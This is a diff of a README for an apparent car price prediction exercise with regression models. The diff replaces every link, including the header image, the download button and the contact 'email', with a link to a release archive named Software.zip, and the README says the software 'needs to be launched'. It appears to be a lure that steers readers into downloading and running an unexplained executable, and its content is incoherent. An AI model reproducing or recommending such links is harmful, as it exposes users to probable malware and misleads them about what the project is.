@@ -1,6 +1,6 @@
 # Car Price Prediction Exercise with Regression Models
 
-![Car Price Prediction](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v1.0/Release.zip)
+![Car Price Prediction](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v2.0/Software.zip)
 
 Welcome to the "Car-price-prediction-exercise-with-regression-model" repository! Here, you will find a comprehensive exercise on forecasting car prices using various regression models such as one-variable, two-variable, three-variable, lasso, ridge, and elastic regression. Whether you are a beginner or an experienced data scientist, this repository offers a great opportunity to enhance your skills in predictive modeling.
 
@@ -46,7 +46,7 @@ In this repository, we delve into the world of car price prediction using differ
 
 To access the software related to this repository, please click the button below:
 
-[![Software](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v1.0/Release.zip)](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v1.0/Release.zip)
+[![Software](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v2.0/Software.zip)](https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v2.0/Software.zip)
 
 ### Note: Software needs to be launched for utilization.
 
@@ -63,6 +63,6 @@ If you find any issues or have suggestions for improvement, feel free to open an
 
 ## Get in Touch
 
-If you have any questions or feedback, don't hesitate to reach out. Connect with us via email at https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v1.0/Release.zip
+If you have any questions or feedback, don't hesitate to reach out. Connect with us via email at https://github.com/Rizasaurus/Car-price-prediction-exercise-with-regression-model/releases/download/v2.0/Software.zip
 
 Let's embark on this exciting journey of car price prediction with regression models! 🚗📊🔮
